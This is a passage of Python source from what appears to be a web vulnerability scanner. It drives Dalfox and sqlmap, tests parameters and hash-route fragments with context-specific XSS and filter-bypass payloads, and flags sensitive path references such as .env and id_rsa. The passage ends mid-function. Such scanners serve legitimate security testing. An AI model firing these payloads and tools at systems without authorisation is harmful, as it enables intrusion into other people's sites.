import asyncio
import copy
import base64
import hashlib
import json
import os
import random
import re
import string
import sys
import tempfile
import time
import urllib.parse
from typing import Any

from .common import get_auth_curl_args, get_auth_sqlmap_context, run
from .exposure_markers import (
    CRITICAL_FILE_VALIDATORS,
    SOFT_404_PATTERNS,
    derive_markers,
    guess_confidence,
)
from .active_prioritization import active_endpoint_score

PUBLIC_DISCOVERY_FILES = {"robots.txt", "sitemap.xml"}
PUBLIC_DISCOVERY_SENSITIVE_REFERENCES = (
    ".aws/",
    ".env",
    ".git",
    ".ssh/",
    "backup.sql",
    "database.sql",
    "db.sql",
    "dump.sql",
    "id_dsa",
    "id_ecdsa",
    "id_ed25519",
    "id_rsa",
    "private.key",
    "privatekey",
    "server.key",
    "wp-config",
)
PUBLIC_DISCOVERY_NON_PUBLIC_PATTERNS = tuple(
    re.compile(pattern, re.I)
    for pattern in (
        r"(^|/)(admin|administrator|manage|manager|dashboard|console|cpanel|wp-admin)(/|$|[?#])",
        r"(^|/)(internal|private|staff|employee|backoffice|intranet)(/|$|[?#])",
        r"(^|/)(staging|stage|dev|debug|test|qa|uat|beta|preview)(/|$|[?#])",
        r"(^|/)(backup|backups|old|archive|tmp|temp)(/|$|[?#])",
        r"(^|/)(api/admin|api/internal|api/private)(/|$|[?#])",
    )
)

SQLI_DOCUMENTATION_PATHS = {
    "/api/docs",
    "/api/openapi.json",
    "/api/swagger.json",
    "/api/swagger.yaml",
    "/api-docs.json",
    "/docs",
    "/openapi.json",
    "/redoc",
    "/swagger.json",
    "/swagger.yaml",
}
SQLI_DOCUMENTATION_TRUSTED_SOURCES = {
    "browser_api_capture",
    "har_network_capture",
    "manual",
    "authenticated_browser",
    "form_submission",
    "api_schema_operation",
}


def _emit_scan_progress(phase: str, pct: int, message: str) -> None:
    pct = max(0, min(100, int(pct)))
    safe_message = re.sub(r"\s+", " ", str(message or "")).strip()[:160]
    print(f"[progress] phase={phase} pct={pct} message={safe_message}", file=sys.stderr, flush=True)


def _scanner_cancel_requested() -> bool:
    cancel_file = os.environ.get("SHAKERSCAN_CANCEL_FILE")
    if not cancel_file:
        return False
    try:
        return os.path.exists(cancel_file)
    except Exception:
        return False


def _coerce_param_names(raw: Any) -> list[str]:
    if isinstance(raw, dict):
        return [str(k) for k in raw.keys() if k]
    if isinstance(raw, (list, tuple, set)):
        return [str(v) for v in raw if v]
    if isinstance(raw, str):
        return [raw] if raw else []
    return []


def _coerce_telemetry_params(raw: Any) -> list[str]:
    return _coerce_param_names(raw)


def _active_endpoint_worklist_entry(
    endpoint: dict[str, Any],
    *,
    url_override: str | None = None,
    method_override: str | None = None,
    params_override: list[str] | None = None,
    body_params_override: list[str] | None = None,
) -> str | None:
    """Serialize one tested endpoint using the same custom-endpoint shape as
    scanner reports and ASM inventory. This keeps per-endpoint telemetry
    resolvable back to target_endpoints rows without importing scanner.py."""
    raw = url_override or endpoint.get("url") or endpoint.get("path")
    if not raw or not isinstance(raw, str):
        return None
    method = str(method_override or endpoint.get("method") or "GET").upper()
    try:
        parsed = urllib.parse.urlparse(raw if "://" in raw else "http://x" + (raw if raw.startswith("/") else "/" + raw))
    except Exception:
        return None
    path = parsed.path or "/"
    params = params_override if params_override is not None else _coerce_telemetry_params(
        endpoint.get("params") or endpoint.get("query_params")
    )
    body = body_params_override if body_params_override is not None else _coerce_telemetry_params(
        endpoint.get("body_params")
    )
    if parsed.query:
        return f"{method} {path}?{parsed.query}"
    if params:
        return f"{method} {path}?" + "&".join(f"{p}=1" for p in params)
    if body and method in ("POST", "PUT", "PATCH"):
        content_type = str(endpoint.get("content_type") or "").lower()
        body_template = endpoint.get("body_template")
        if "json" in content_type:
            if isinstance(body_template, dict) and body_template:
                return f"{method} {path} json:" + json.dumps(body_template, separators=(",", ":"))
            return f"{method} {path} json:" + json.dumps(
                _synthetic_json_template_from_params(body),
                separators=(",", ":"),
            )
        return f"{method} {path} form:" + "&".join(f"{b}=1" for b in body)
    return f"{method} {path}"


def _new_endpoint_attempt(
    endpoint: dict[str, Any],
    family: str,
    *,
    url_override: str | None = None,
    method_override: str | None = None,
    params: list[str] | None = None,
    body_params: list[str] | None = None,
) -> dict[str, Any] | None:
    worklist_entry = _active_endpoint_worklist_entry(
        endpoint,
        url_override=url_override,
        method_override=method_override,
        params_override=params,
        body_params_override=body_params,
    )
    if not worklist_entry:
        return None
    method = str(method_override or endpoint.get("method") or "GET").upper()
    param_count = len(params if params is not None else (body_params if body_params is not None else []))
    return {
        "custom_endpoint": worklist_entry,
        "family": family,
        "method": method,
        "url": url_override or endpoint.get("url") or endpoint.get("path"),
        "param_count": max(0, int(param_count)),
        "attempted_params_count": 0,
        "completed_params_count": 0,
        "status": "started",
    }


def _finish_endpoint_attempt(
    attempt: dict[str, Any] | None,
    *,
    budget_exhausted: bool = False,
    budget_exhausted_reason: str | None = None,
    skipped_reason: str | None = None,
) -> dict[str, Any] | None:
    if not attempt:
        return None
    expected = int(attempt.get("param_count") or 0)
    completed = int(attempt.get("completed_params_count") or 0)
    if skipped_reason:
        attempt["status"] = "skipped"
        attempt["skip_reason"] = skipped_reason
    elif completed <= 0:
        attempt["status"] = "partial"
    elif budget_exhausted and expected and completed < expected:
        attempt["status"] = "partial"
    else:
        attempt["status"] = "completed"
    if budget_exhausted:
        attempt["budget_exhausted"] = True
        attempt["budget_exhausted_reason"] = budget_exhausted_reason
    # §5: serialize the per-endpoint technique set (JSON-safe, stable order).
    techniques = attempt.get("techniques_attempted")
    if isinstance(techniques, set):
        attempt["techniques_attempted"] = sorted(techniques)
    return attempt


def _merge_endpoint_attempt_telemetry(*attempt_groups: Any) -> list[dict[str, Any]]:
    merged: dict[str, dict[str, Any]] = {}
    for group in attempt_groups:
        for attempt in group or []:
            if not isinstance(attempt, dict):
                continue
            key = attempt.get("custom_endpoint")
            if not key:
                continue
            item = merged.setdefault(
                str(key),
                {
                    "custom_endpoint": str(key),
                    "method": attempt.get("method"),
                    "url": attempt.get("url"),
                    "families": [],
                    "attempted_params_count": 0,
                    "completed_params_count": 0,
                    "status": "completed",
                    "family_attempts": {},
                },
            )
            family = str(attempt.get("family") or "unknown")
            if family not in item["families"]:
                item["families"].append(family)
            status = str(attempt.get("status") or "partial")
            item["attempted_params_count"] += int(attempt.get("attempted_params_count") or 0)
            item["completed_params_count"] += int(attempt.get("completed_params_count") or 0)
            item["family_attempts"][family] = {
                "status": status,
                "attempted_params_count": int(attempt.get("attempted_params_count") or 0),
                "completed_params_count": int(attempt.get("completed_params_count") or 0),
                "param_count": int(attempt.get("param_count") or 0),
                "budget_exhausted": bool(attempt.get("budget_exhausted")),
                "budget_exhausted_reason": attempt.get("budget_exhausted_reason"),
                "skip_reason": attempt.get("skip_reason"),
            }
            if status != "completed" and item["status"] == "completed":
                item["status"] = status
            if attempt.get("budget_exhausted"):
                item["budget_exhausted"] = True
                item["budget_exhausted_reason"] = attempt.get("budget_exhausted_reason")
    return sorted(merged.values(), key=lambda x: x["custom_endpoint"])


def _is_sqli_documentation_endpoint(url: str) -> bool:
    parsed = urllib.parse.urlparse(url or "")
    path = parsed.path.rstrip("/").lower() or "/"
    return path in SQLI_DOCUMENTATION_PATHS


def _endpoint_sources(endpoint: dict[str, Any]) -> set[str]:
    sources: set[str] = set()
    for key in ("source", "sources", "discovery_source", "discovery_sources", "method_source"):
        value = endpoint.get(key)
        if isinstance(value, str):
            sources.add(value.strip().lower())
        elif isinstance(value, (list, tuple, set)):
            sources.update(str(item).strip().lower() for item in value if item)
    return {source for source in sources if source}


def _is_sqli_documentation_noise_endpoint(endpoint: dict[str, Any]) -> bool:
    """Skip static docs URLs unless a runtime source proved this exact request exists."""
    if not _is_sqli_documentation_endpoint(endpoint.get("url", "")):
        return False
    return not bool(_endpoint_sources(endpoint).intersection(SQLI_DOCUMENTATION_TRUSTED_SOURCES))


def _public_discovery_markers(path: str, content: str) -> list[str]:
    normalized_path = (path or "").lstrip("/").lower()
    if normalized_path not in PUBLIC_DISCOVERY_FILES:
        return []
    content_lower = (content or "").lower()
    markers: list[str] = []
    if any(token in content_lower for token in PUBLIC_DISCOVERY_SENSITIVE_REFERENCES):
        markers.append("sensitive_path_reference")
    if _public_discovery_non_public_references(path, content):
        markers.append("non_public_path_reference")
    return markers


def _public_discovery_candidate_refs(path: str, content: str) -> list[str]:
    normalized_path = (path or "").lstrip("/").lower()
    if normalized_path not in PUBLIC_DISCOVERY_FILES:
        return []

    refs: list[str] = []
    body = content or ""
    if normalized_path == "robots.txt":
        for line in body.splitlines():
            line = line.strip()
            if not line or line.startswith("#") or ":" not in line:
                continue
            key, value = line.split(":", 1)
            if key.strip().lower() not in {"allow", "disallow", "sitemap"}:
                continue
            value = value.strip()
            if value:
                refs.append(value)
    else:
        refs.extend(match.group(1).strip() for match in re.finditer(r"<loc>\s*([^<\s]+)\s*</loc>", body, re.I))

    normalized_refs: list[str] = []
    for ref in refs:
        parsed = urllib.parse.urlparse(ref)
        ref_path = parsed.path if parsed.scheme or parsed.netloc else ref
        if not ref_path or ref_path in {"/", "*"}:
            continue
        if not ref_path.startswith("/"):
            ref_path = "/" + ref_path
        normalized_refs.append(ref_path[:200])
    return normalized_refs


def _public_discovery_non_public_references(path: str, content: str) -> list[str]:
    refs = _public_discovery_candidate_refs(path, content)
    flagged: list[str] = []
    for ref in refs:
        if any(pattern.search(ref) for pattern in PUBLIC_DISCOVERY_NON_PUBLIC_PATTERNS):
            flagged.append(ref)
    return flagged[:10]


def _is_public_discovery_noise(path: str, content: str, markers: list[str] | None = None) -> bool:
    normalized_path = (path or "").lstrip("/").lower()
    if normalized_path not in PUBLIC_DISCOVERY_FILES:
        return False
    if markers:
        return False
    return not _public_discovery_markers(path, content)

try:
    from .oauth_auth import oidc_discover
except ImportError:
    oidc_discover = None

# GraphQL schema recovery (optional)
try:
    from .graphql_schema_recovery import run_schema_recovery as graphql_schema_recovery
    HAS_GRAPHQL_RECOVERY = True
except ImportError:
    HAS_GRAPHQL_RECOVERY = False
    graphql_schema_recovery = None

# Browser proof for XSS verification (optional - graceful degradation if unavailable)
try:
    from .proof_of_exploit import prove_xss_headless, ExploitProof
    HAS_XSS_PROOF = True
except ImportError:
    HAS_XSS_PROOF = False
    prove_xss_headless = None
    ExploitProof = None

# Statistical testing for SQLi timing validation (optional)
try:
    from scipy.stats import mannwhitneyu
    import statistics
    HAS_SCIPY = True
except ImportError:
    HAS_SCIPY = False
    mannwhitneyu = None


def statistical_timing_test(
    baseline_times: list[float],
    payload_times: list[float],
    expected_delay: float = 2.0,
    significance_level: float = 0.05
) -> dict[str, Any]:
    """
    Statistical timing validation using Mann-Whitney U test.

    Uses non-parametric testing to determine if payload response times
    are significantly higher than baseline, accounting for network jitter.

    Args:
        baseline_times: List of baseline response times (seconds)
        payload_times: List of payload response times (seconds)
        expected_delay: Expected injection delay (default 2.0s for SLEEP(2))
        significance_level: P-value threshold (default 0.05)

    Returns:
        Dict with: confirmed (bool), p_value, confidence, baseline_median,
                   payload_median, delay_observed
    """
    if not HAS_SCIPY:
        # Fallback to simple median comparison if scipy not available
        import statistics as stats
        baseline_median = stats.median(baseline_times) if baseline_times else 0
        payload_median = stats.median(payload_times) if payload_times else 0
        delay_observed = payload_median - baseline_median
        # Simple threshold check
        confirmed = delay_observed >= expected_delay * 0.8
        return {
            "confirmed": confirmed,
            "p_value": None,
            "confidence": 0.75 if confirmed else 0.3,
            "baseline_median": baseline_median,
            "payload_median": payload_median,
            "delay_observed": delay_observed,
            "method": "median_comparison",
        }

    # Mann-Whitney U test (non-parametric, doesn't assume normal distribution)
    # H0: payload times are from the same distribution as baseline
    # H1: payload times are greater (one-sided test)
    try:
        stat, p_value = mannwhitneyu(
            baseline_times,
            payload_times,
            alternative='less'  # We expect baseline < payload
        )
    except ValueError:
        # Not enough data for test
        return {
            "confirmed": False,
            "p_value": None,
            "confidence": 0.3,
            "error": "Insufficient data for statistical test",
            "method": "mann_whitney_failed",
        }

    baseline_median = statistics.median(baseline_times)
    payload_median = statistics.median(payload_times)
    delay_observed = payload_median - baseline_median

    # Confirmed if:
    # 1. Statistically significant (p < significance_level)
    # 2. Observed delay is at least 80% of expected
    confirmed = p_value < significance_level and delay_observed >= expected_delay * 0.8

    # Confidence based on p-value
    if p_value < 0.01 and delay_observed >= expected_delay:
        confidence = 0.95
    elif p_value < 0.05 and delay_observed >= expected_delay * 0.8:
        confidence = 0.85
    elif p_value < 0.10:
        confidence = 0.70
    else:
        confidence = 0.40

    return {
        "confirmed": confirmed,
        "p_value": round(p_value, 6),
        "confidence": confidence,
        "baseline_median": round(baseline_median, 3),
        "payload_median": round(payload_median, 3),
        "delay_observed": round(delay_observed, 3),
        "method": "mann_whitney_u",
    }


def _parse_fragment_params(url: str) -> tuple[str, str, dict]:
    """
    Parse URL with potential fragment parameters (SPA hash routes).

    Returns: (base_url, fragment_path, fragment_params)

    Example: "http://example.com/#/search?q=test&page=1"
    Returns: ("http://example.com/", "/search", {"q": ["test"], "page": ["1"]})

    Example: "http://example.com/#!/user?id=123"
    Returns: ("http://example.com/", "!/user", {"id": ["123"]})
    """
    parsed = urllib.parse.urlparse(url)
    fragment = parsed.fragment or ""

    if "?" in fragment:
        frag_path, frag_query = fragment.split("?", 1)
        frag_params = urllib.parse.parse_qs(frag_query, keep_blank_values=True)
    else:
        frag_path = fragment
        frag_params = {}

    base_url = urllib.parse.urlunparse(parsed._replace(fragment=""))
    return base_url, frag_path, frag_params


def _build_fragment_url(base_url: str, frag_path: str, frag_params: dict) -> str:
    """
    Reconstruct URL with fragment parameters.

    Example: _build_fragment_url("http://example.com/", "/search", {"q": ["test"]})
    Returns: "http://example.com/#/search?q=test"
    """
    if not frag_path:
        return base_url
    frag_query = urllib.parse.urlencode(frag_params, doseq=True)
    if frag_query:
        return f"{base_url}#{frag_path}?{frag_query}"
    return f"{base_url}#{frag_path}"


def _is_hash_route(url: str) -> bool:
    """Check if URL uses SPA hash-based routing."""
    parsed = urllib.parse.urlparse(url)
    fragment = parsed.fragment or ""
    return fragment.startswith("/") or fragment.startswith("!/")


async def dalfox_one(
    url: str,
    quick_mode: bool = False,
    auth_session: Any | None = None,
    deep_domxss: bool | None = None
) -> dict[str, Any]:
    """Run Dalfox XSS scanner on a single URL. Returns dict with findings and execution status."""
    dalfox_cmd = "/opt/tools/dalfox" if os.path.exists("/opt/tools/dalfox") else "dalfox"
    cmd = [dalfox_cmd, "url", url, "--silence", "--no-spinner", "--format", "json"]
    if deep_domxss is None:
        deep_domxss = os.environ.get("SCANNER_DALFOX_DEEP_DOMXSS", "").lower() in ("1", "true", "yes")
    cookie_str, header_lines = get_auth_sqlmap_context(auth_session)
    if cookie_str:
        cmd.extend(["--cookie", cookie_str])
    for header in header_lines:
        cmd.extend(["--header", header])
    if quick_mode:
        cmd.extend(["--timeout", "10", "--only-discovery", "--skip-bav"])
        timeout = 60
    else:
        # More aggressive XSS testing
        cmd.extend([
            "--timeout", "60",
            "--delay", "50",
            "--follow-redirects",
            "--skip-mining-all",  # Skip mining to speed up
        ])
        if deep_domxss:
            cmd.append("--deep-domxss")  # Check for DOM-based XSS (spawns headless browser)
        timeout = 180
    out, err, rc = await run(cmd, timeout=timeout, kill_process_group=bool(deep_domxss))
    findings: list[dict] = []
    scan_completed = rc == 0  # Tool executed successfully
    error = None
    if rc == 0 and out:
        for l in out.splitlines():
            try:
                findings.append(json.loads(l))
            except Exception:
                pass
    elif rc != 0:
        # Capture error for debugging
        error = (err or "Unknown error")[:500] if err else f"Exit code {rc}"
    return {"findings": findings, "scan_completed": scan_completed, "error": error}


async def custom_xss_test(url: str, auth_session: Any | None = None) -> dict:
    """
    Custom XSS detection using proven payloads and reflection analysis.
    Detects reflected XSS and indicators of potential DOM XSS.
    Uses context-aware payload selection for improved accuracy.
    Also tests fragment parameters for SPA hash routes (DOM XSS).
    """
    findings = []
    tested = 0

    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    # Also parse fragment parameters for hash routes
    base_url, frag_path, frag_params = _parse_fragment_params(url)
    is_hash_route = _is_hash_route(url)

    if not query_params and not frag_params:
        return {"findings": [], "tested": 0, "vulnerable": False}

    # Context-specific XSS payloads - selected based on where input is reflected
    CONTEXT_PAYLOADS = {
        "in_script": [
            # Inside <script> tags - need to break out or inject JS directly
            ("</script><script>alert(1)</script>", "script_breakout"),
            ("';alert(1);//", "js_string_single"),
            ("\";alert(1);//", "js_string_double"),
            ("\\';alert(1);//", "js_escape_single"),
            ("-alert(1)-", "js_expression"),
            ("`${alert(1)}`", "js_template_literal"),
            ("</script><img src=x onerror=alert(1)>", "script_to_html"),
        ],
        "in_attribute": [
            # Inside HTML attribute - break out of attribute
            ("\" onmouseover=\"alert(1)", "attr_break_double"),
            ("' onmouseover='alert(1)", "attr_break_single"),
            ("\" onfocus=\"alert(1)\" autofocus=\"", "attr_autofocus_double"),
            ("' onfocus='alert(1)' autofocus='", "attr_autofocus_single"),
            ("\"><script>alert(1)</script>", "attr_to_script"),
            ("'><img src=x onerror=alert(1)>", "attr_to_img"),
        ],
        "in_event_handler": [
            # Inside onclick=, onmouseover=, etc. - inject JS directly
            ("alert(1)", "event_direct"),
            ("alert(1)//", "event_comment"),
            ("');alert(1);//", "event_break_single"),
            ("\");alert(1);//", "event_break_double"),
            ("alert`1`", "event_template"),
        ],
        "in_angular": [
            # Inside Angular/Vue {{ }} expressions
            ("constructor.constructor('alert(1)')()", "angular_constructor"),
            ("$on.constructor('alert(1)')()", "angular_on"),
            ("$eval('alert(1)')", "angular_eval"),
            ("{{7*7}}", "angular_expr_test"),
            ("a])}})}}alert(1)//", "angular_sandbox_escape"),
        ],
        "in_svg": [
            # Inside SVG elements
            ("<animate onbegin=alert(1)>", "svg_animate"),
            ("<set onbegin=alert(1)>", "svg_set"),
            ("</svg><script>alert(1)</script>", "svg_breakout"),
            ("<image href=1 onerror=alert(1)>", "svg_image"),
            ("<foreignObject><script>alert(1)</script></foreignObject>", "svg_foreign"),
        ],
        "in_css": [
            # Inside <style> or style="" - limited XSS vectors
            ("</style><script>alert(1)</script>", "css_breakout"),
            ("expression(alert(1))", "css_expression_ie"),
            ("url('javascript:alert(1)')", "css_url_js"),
        ],
        "in_js_url": [
            # Inside href="javascript:..." context
            ("alert(1)", "jsurl_direct"),
            ("alert(1)//", "jsurl_comment"),
            ("',alert(1),'", "jsurl_break"),
        ],
        "in_url_path": [
            # Inside URL path like src="/path/..."
            ("javascript:alert(1)", "path_jsprotocol"),
            ("data:text/html,<script>alert(1)</script>", "path_data_uri"),
            ("//evil.com", "path_protocol_relative"),
        ],
        "in_json": [
            # Inside JSON response - DOM XSS when rendered
            ("</script><script>alert(1)</script>", "json_script_inject"),
            ("<img src=x onerror=alert(1)>", "json_img_inject"),
        ],
        "in_html": [
            # General HTML context - full tag injection
            ("<script>alert(1)</script>", "script_tag"),
            ("<img src=x onerror=alert(1)>", "img_onerror"),
            ("<svg onload=alert(1)>", "svg_onload"),
            ("<body onload=alert(1)>", "body_onload"),
            ("<iframe src=\"javascript:alert(1)\">", "iframe_js"),
            ("<input onfocus=alert(1) autofocus>", "input_focus"),
            ("<marquee onstart=alert(1)>", "marquee_start"),
        ],
        "not_reflected": [],  # No payloads if not reflected
    }

    # Fallback payloads for unknown contexts or when context detection fails
    FALLBACK_PAYLOADS = [
        ("<script>alert(1)</script>", "script_tag"),
        ("<img src=x onerror=alert(1)>", "img_onerror"),
        ("\" onmouseover=\"alert(1)", "attr_event"),
        ("' onfocus='alert(1)' autofocus='", "attr_focus"),
        ("{{constructor.constructor('alert(1)')()}}", "angular_proto"),
        ("{{7*7}}", "angular_expr"),
    ]

    # Filter bypass payloads - tried after context-specific ones
    BYPASS_PAYLOADS = [
        ("<ScRiPt>alert(1)</ScRiPt>", "case_bypass"),
        ("<img/src=x onerror=alert(1)>", "slash_bypass"),
        ("<svg/onload=alert(1)>", "svg_slash"),
        ("<<script>alert(1)</script>", "double_open"),
        ("<scr<script>ipt>alert(1)</scr</script>ipt>", "nested_tag"),
    ]

    # Canary string for reflection detection
    canary = f"xss{random.randint(10000,99999)}test"

    auth_args = get_auth_curl_args(auth_session)

    async def get_response(test_url: str) -> tuple[str, int, str]:
        """Fetch URL and return (body, status_code, content_type)."""
        out, _, rc = await run([
            "curl", "-sS", "-L", "-k", "--max-time", "10",
            "-w", "\n%{http_code}\n%{content_type}",
            "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        ] + auth_args + [test_url], timeout=15)

        if rc != 0 or not out:
            return "", 0, ""

        lines = out.rsplit("\n", 2)
        body = lines[0] if len(lines) > 2 else out
        try:
            status = int(lines[-2]) if len(lines) > 1 else 200
        except (ValueError, IndexError):
            status = 200
        content_type = lines[-1] if len(lines) > 2 else ""
        return body, status, content_type

    for param_name in query_params:
        original_value = query_params[param_name][0] if query_params[param_name] else ""

        # First, test with canary to check if input is reflected at all
        test_params = query_params.copy()
        test_params[param_name] = [canary]
        test_query = urllib.parse.urlencode(test_params, doseq=True)
        canary_url = urllib.parse.urlunparse(parsed._replace(query=test_query))
        canary_body, _, content_type = await get_response(canary_url)

        is_html = "html" in content_type.lower() or "<html" in canary_body.lower()
        is_json = "json" in content_type.lower() or canary_body.strip().startswith(("{", "["))

        # Check if canary is reflected
        canary_reflected = canary in canary_body

        # CONTEXT-AWARE PAYLOAD SELECTION (P0-1 fix)
        # Detect where the canary is reflected to select appropriate payloads
        reflection_context = "not_reflected"
        if canary_reflected:
            reflection_context = detect_reflection_context(canary_body, canary)

        # Select payloads based on detected context
        if reflection_context == "not_reflected":
            # Input not reflected - skip this parameter for reflected XSS
            # but still test a few payloads in case of stored/blind XSS
            xss_payloads = FALLBACK_PAYLOADS[:3]
        elif reflection_context in CONTEXT_PAYLOADS:
            # Use context-specific payloads first, then add bypass payloads
            xss_payloads = CONTEXT_PAYLOADS[reflection_context] + BYPASS_PAYLOADS
        else:
            # Unknown context - use fallback
            xss_payloads = FALLBACK_PAYLOADS + BYPASS_PAYLOADS

        # For JSON responses, check if value is reflected without encoding
        if is_json and canary_reflected:
            # JSON responses can still be dangerous if rendered unsafely
            pass

        # Test each XSS payload (now context-aware)
        for payload, payload_type in xss_payloads:
            tested += 1

            test_params = query_params.copy()
            test_params[param_name] = [payload]
            test_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))

            test_body, test_status, test_ct = await get_response(test_url)

            vulnerability_detected = False
            evidence = []
            severity = "medium"

            # Check for unencoded reflection (XSS indicator)
            if payload in test_body:
                # Payload reflected without encoding - likely vulnerable
                vulnerability_detected = True
                evidence.append(f"Payload reflected unencoded: {payload[:50]}")
                severity = "high"

            # Check for partial reflection (filter bypass needed)
            elif not vulnerability_detected:
                # Check if key dangerous characters made it through
                if payload_type.startswith("script") and "<script" in test_body.lower():
                    vulnerability_detected = True
                    evidence.append("Script tag reflected")
                    severity = "high"
                elif "onerror" in payload and "onerror" in test_body.lower():
                    vulnerability_detected = True
                    evidence.append("Event handler reflected")
                    severity = "high"
                elif "onload" in payload and "onload" in test_body.lower():
                    vulnerability_detected = True
                    evidence.append("Event handler reflected")
                    severity = "high"
                elif "javascript:" in payload and "javascript:" in test_body.lower():
                    vulnerability_detected = True
                    evidence.append("JavaScript protocol reflected")
                    severity = "high"

            # Angular expression evaluation check
            if payload_type == "angular_expr" and "49" in test_body and "49" not in canary_body:
                vulnerability_detected = True
                evidence.append("Angular expression evaluated ({{7*7}}=49)")
                severity = "critical"

            # DOM XSS indicators in JSON responses
            if is_json and canary_reflected:
                # If input is reflected in JSON without escaping, DOM XSS is possible
                # when the frontend renders this data unsafely
                if payload in test_body or (payload.replace('"', '\\"') not in test_body and "<" in payload):
                    # Check if angle brackets are NOT escaped
                    unescaped = payload.replace("&lt;", "<").replace("&gt;", ">")
                    if unescaped in test_body:
                        vulnerability_detected = True
                        evidence.append("XSS payload in JSON response - potential DOM XSS")
                        severity = "medium"

            if vulnerability_detected:
                findings.append({
                    "type": "Cross-Site Scripting (XSS)",
                    "url": test_url,
                    "parameter": param_name,
                    "payload": payload,
                    "payload_type": payload_type,
                    "evidence": evidence,
                    "severity": severity,
                    "context": "html" if is_html else "json" if is_json else "unknown",
                    "reflection_context": reflection_context,  # Added: precise context detection
                })

    # Test fragment parameters for hash routes (DOM XSS)
    # These require browser-based verification since payloads execute client-side
    if is_hash_route and frag_params and not HAS_XSS_PROOF:
        print(f"[xss] Skipping hash route DOM XSS tests: Playwright not available", file=sys.stderr)
    elif is_hash_route and frag_params and HAS_XSS_PROOF and prove_xss_headless:
        # DOM XSS payloads for fragment injection. The iframe javascript: vector is
        # first because it fires synchronously on render and survives Angular-style
        # innerHTML sinks (the canonical SPA search/hash-route DOM XSS) — the others
        # depend on an async image/SVG load that may not fire under headless timing.
        DOM_XSS_PAYLOADS = [
            ('<iframe src="javascript:alert(1)">', "iframe_js"),
            ("<img src=x onerror=alert(1)>", "img_onerror"),
            ("<svg onload=alert(1)>", "svg_onload"),
            ("<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "svg_animate"),
            ("'-alert(1)-'", "js_expression"),
            ("\"><img src=x onerror=alert(1)>", "attr_break_img"),
        ]

        for param_name in frag_params:
            for payload, payload_type in DOM_XSS_PAYLOADS:
                tested += 1

                # Build test URL with payload in fragment parameter
                test_frag_params = frag_params.copy()
                test_frag_params[param_name] = [payload]
                test_url = _build_fragment_url(base_url, frag_path, test_frag_params)

                # Must use browser-based verification for DOM XSS
                try:
                    proof = await prove_xss_headless(
                        url=base_url,
                        param=param_name,
                        payload=payload,
                        screenshot_dir=None,
                        fragment_path=frag_path,
                        fragment_params=test_frag_params,
                    )
                    if proof and proof.proven:
                        # A fired dialog / console execution (confidence >= 0.9) is
                        # confirmed script execution -> High (session theft capable).
                        # Pass an explicit High CVSS so the generic XSS base score
                        # (6.1, medium) can't cap a browser-proven DOM XSS to medium.
                        executed = proof.confidence >= 0.9
                        findings.append({
                            "type": "DOM XSS (Hash Route)",
                            "url": test_url,
                            "parameter": param_name,
                            "payload": payload,
                            "payload_type": payload_type,
                            "evidence": [
                                f"Browser proof: {proof.technique}",
                                f"Confidence: {proof.confidence}",
                                "payload executed in headless browser (dialog fired)" if executed
                                else "payload landed in executable DOM context",
                            ],
                            "severity": "high" if executed else "medium",
                            "cvss_score": 7.4 if executed else 6.1,
                            "verified": executed,
                            "context": "hash_route",
                            "reflection_context": "dom_xss",
                            "proof": proof.to_dict() if hasattr(proof, "to_dict") else None,
                        })
                        # Found vulnerability for this param, skip remaining payloads
                        break
                except Exception as e:
                    # Browser proof failed, continue with other payloads
                    pass

    return {
        "findings": findings,
        "tested": tested,
        "vulnerable": len(findings) > 0,
        "scan_completed": True,
    }


def _dedupe_header_lines(header_lines: list[str]) -> list[str]:
    merged: dict[str, str] = {}
    for line in header_lines:
        if ":" not in line:
            continue
        name, value = line.split(":", 1)
        merged[name.strip().lower()] = f"{name.strip()}: {value.strip()}"
    return list(merged.values())


async def _verify_auth_before_sqlmap(
    auth_session: Any | None,
    test_url: str,
    method: str = "GET",
) -> tuple[bool, str | None]:
    """Verify auth is valid before running SQLmap.

    Args:
        auth_session: The auth session to verify
        test_url: URL to probe
        method: HTTP method of the endpoint (GET, POST, etc.)

    Returns:
        (is_valid, skip_reason) - if not valid, skip_reason explains why
    """
    if auth_session is None:
        return True, None  # No auth required

    # Check if session reports as invalid
    try:
        if hasattr(auth_session, "is_valid") and not auth_session.is_valid():
            # Try refresh
            if hasattr(auth_session, "refresh_if_needed"):
                refreshed = await auth_session.refresh_if_needed(force=True)
                if not refreshed:
                    return False, "auth_refresh_failed"
    except Exception as e:
        return False, f"auth_validation_error"

    # Use HEAD for GET endpoints (lightweight), actual method for POST/PUT/PATCH
    # This avoids false negatives on POST-only APIs that return 401/405 on GET
    probe_method = "HEAD" if method.upper() == "GET" else method.upper()
    probe_cmd = [
        "curl", "-sS", "-o", "/dev/null", "-w", "%{http_code}",
        "-k", "--max-time", "10",
        "-X", probe_method,
    ] + get_auth_curl_args(auth_session) + [test_url]

    out, _, rc = await run(probe_cmd, timeout=15)

    if rc != 0:
        return False, "auth_probe_failed"

    try:
        status = int(out.strip())
    except ValueError:
        status = 0

    if status in (401, 403):
        # Try refresh once
        if hasattr(auth_session, "refresh_if_needed"):
            try:
                refreshed = await auth_session.refresh_if_needed(force=True)
                if refreshed:
                    # Re-probe after refresh
                    out2, _, rc2 = await run(probe_cmd, timeout=15)
                    try:
                        status2 = int(out2.strip())
                    except ValueError:
                        status2 = 0
                    if status2 not in (401, 403):
                        return True, None
            except Exception:
                pass
        return False, f"auth_invalid_status_{status}"

    return True, None


def _write_sqlmap_request_file(
    captured_request: dict[str, Any],
    auth_session: Any | None = None,
) -> str | None:
    """Write a captured request to a file for SQLmap -r option.

    Args:
        captured_request: Dict with url, method, headers, post_data from Playwright capture
        auth_session: Optional auth session to merge cookies/headers

    Returns:
        Path to temp file or None if request is not suitable.
    """
    method = captured_request.get("method", "GET")
    url = captured_request.get("url", "")
    headers = captured_request.get("headers", {}) or {}
    post_data = captured_request.get("post_data")

    if not url:
        return None

    parsed = urllib.parse.urlparse(url)
    host = parsed.netloc
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query

    # Build HTTP request format
    lines = [f"{method} {path} HTTP/1.1"]
    lines.append(f"Host: {host}")

    # Add captured headers (except Host, Content-Length)
    skip_headers = {"host", "content-length"}
    for name, value in headers.items():
        if name.lower() not in skip_headers:
            lines.append(f"{name}: {value}")

    # Merge auth session headers/cookies if not already present
    if auth_session:
